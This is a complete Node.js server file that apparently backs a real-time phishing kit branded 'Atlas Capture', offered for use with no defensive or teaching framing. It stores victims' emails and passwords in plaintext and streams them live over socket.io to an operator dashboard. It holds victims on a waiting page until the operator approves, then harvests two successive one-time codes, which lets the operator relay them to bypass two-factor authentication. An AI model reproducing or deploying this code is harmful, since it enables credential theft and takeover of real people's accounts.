require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/second-otp', (req, res) => res.sendFile(path.join(publicPath, 'users/second-otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true
});

// Test database connection
pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io authentication - Allow users without token
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  
  if (!token) {
    socket.isUser = true;
    return next();
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return next(new Error('Authentication error'));
    }
    socket.user = user;
    socket.isAdmin = true;
    next();
  });
});

// Socket.io connection
io.on('connection', (socket) => {
  if (socket.isAdmin) {
    console.log('👑 Admin connected:', socket.user?.email, socket.id);
  } else {
    console.log('👤 User connected:', socket.id);
    socket.on('identify', (data) => {
      socket.userEmail = data.email;
      console.log('👤 User identified:', data.email);
    });
  }
  
  socket.emit('test-notification', { 
    message: 'Connected to real-time server',
    timestamp: new Date()
  });
  
  socket.on('disconnect', () => {
    if (socket.isAdmin) {
      console.log('👑 Admin disconnected:', socket.id);
    } else {
      console.log('👤 User disconnected:', socket.id);
    }
  });
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    
    // Create users table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        second_otp VARCHAR(6) DEFAULT NULL,
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        approved BOOLEAN DEFAULT FALSE,
        second_approved BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');

    // Create admin table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    // Add second_approved column if not exists
    await pool.query(`
      ALTER TABLE users 
      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE
    `).catch(() => console.log('✅ second_approved column exists'));

    // Create update timestamp function
    await pool.query(`
      CREATE OR REPLACE FUNCTION update_updated_at_column()
      RETURNS TRIGGER AS $$
      BEGIN
          NEW.updated_at = CURRENT_TIMESTAMP;
          RETURN NEW;
      END;
      $$ language 'plpgsql';
    `);

    // Create trigger
    await pool.query(`
      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
      CREATE TRIGGER update_users_updated_at
          BEFORE UPDATE ON users
          FOR EACH ROW
          EXECUTE FUNCTION update_updated_at_column();
    `);

    // Insert default admin if not exists
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization completed');
    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

// ==================== USER ENDPOINTS ====================

// User login - sends email to admin
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    await pool.query(`
      INSERT INTO users (email, password, otp_verified, approved, second_approved) 
      VALUES ($1, $2, false, false, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false
    `, [email, password]);

    console.log('🔔 SENDING NOTIFICATION TO ADMIN - New Login:', email);
    
    io.emit('user-login', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔐 New user login attempt'
    });

    // Return loading page that waits for admin approval
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Atlas Capture - Processing</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
          *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
          body{
            background:#f3f4f6;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            padding:40px 10px;
          }
          .wrapper{max-width:420px;width:100%}
          .header{
            display:flex;
            justify-content:center;
            align-items:center;
            gap:10px;
            margin-bottom:18px;
          }
          .logo{
            width:34px;height:34px;
            border-radius:8px;
            background:#4f46e5;
          }
          .header span{font-weight:600;font-size:18px}
          .card{
            background:#fff;
            border-radius:22px;
            padding:32px 22px;
            text-align:center;
            box-shadow:0 10px 30px rgba(0,0,0,0.08);
          }
          .spinner{
            width:50px;
            height:50px;
            border:3px solid #e5e7eb;
            border-top-color:#4f46e5;
            border-radius:50%;
            animation:spin 0.8s linear infinite;
            margin:0 auto 20px;
          }
          @keyframes spin{
            to{transform:rotate(360deg);}
          }
          h2{font-size:20px;color:#1f2937;margin-bottom:8px}
          p{color:#6b7280;font-size:14px}
          .email{color:#4f46e5;margin-top:16px;font-weight:500}
        </style>
        <script>
          const email = "${encodeURIComponent(email)}";
          let approvalInterval = null;
          
          function checkApproval() {
            fetch('/api/users/check-approval', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email: decodeURIComponent(email) })
            })
            .then(res => res.json())
            .then(data => {
              if (data.approved) {
                if (approvalInterval) clearInterval(approvalInterval);
                window.location.href = '/users/otp?email=' + email;
              }
            })
            .catch(err => console.log('Checking approval...'));
          }
          
          approvalInterval = setInterval(checkApproval, 2000);
        </script>
      </head>
      <body>
        <div class="wrapper">
          <div class="header">
            <div class="logo"></div>
            <span>Atlas Capture</span>
          </div>
          <div class="card">
            <div class="spinner"></div>
            <h2>Processing your request</h2>
            <p>Please wait while we verify your details</p>
            <div class="email">${email}</div>
          </div>
        </div>
      </body>
      </html>
    `);
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Check if user is approved by admin
app.post('/api/users/check-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    
    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
  } catch (error) {
    console.error('❌ Check approval error:', error.message);
    res.json({ approved: false });
  }
});

// Submit first OTP (waiting for admin approval)
app.post('/api/users/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    
    if (!/^\d{6}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
    }
    
    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false WHERE email = $2', [otp, email]);
    
    io.emit('user-otp-created', { email, otp, timestamp: new Date() });
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Submit second OTP (waiting for admin approval)
app.post('/api/users/submit-second-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    
    if (!/^\d{6}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
    }
    
    await pool.query('UPDATE users SET second_otp = $1, second_approved = false WHERE email = $2', [otp, email]);
    
    io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit second OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Check second approval
app.post('/api/users/check-second-approval', async (req, res) => {
  try {
    const { email } = req.body;
    const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows[0]?.second_approved || false });
  } catch (error) {
    console.error('❌ Check second approval error:', error.message);
    res.json({ approved: false });
  }
});

// ==================== ADMIN ENDPOINTS ====================

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users
app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp,
        second_otp,
        otp_attempts,
        otp_verified,
        approved,
        second_approved,
        created_at,
        updated_at
      FROM users 
      ORDER BY created_at DESC
    `);
    
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin approve first OTP
app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
    console.log('✅ Admin approved user (first OTP):', email);
    
    res.json({ success: true, message: 'User approved' });
  } catch (error) {
    console.error('❌ Approve user error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Admin approve second OTP
app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
    console.log('✅ Admin approved user (second OTP):', email);
    
    res.json({ success: true, message: 'Second approval complete' });
  } catch (error) {
    console.error('❌ Approve second error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== HEALTH CHECK ====================

app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

// ==================== ERROR HANDLING ====================

app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// ==================== START SERVER ====================

const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
      console.log('\n📢 Socket.io server ready for real-time notifications\n');
    });
  } else {
    process.exit(1);
  }
});

process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});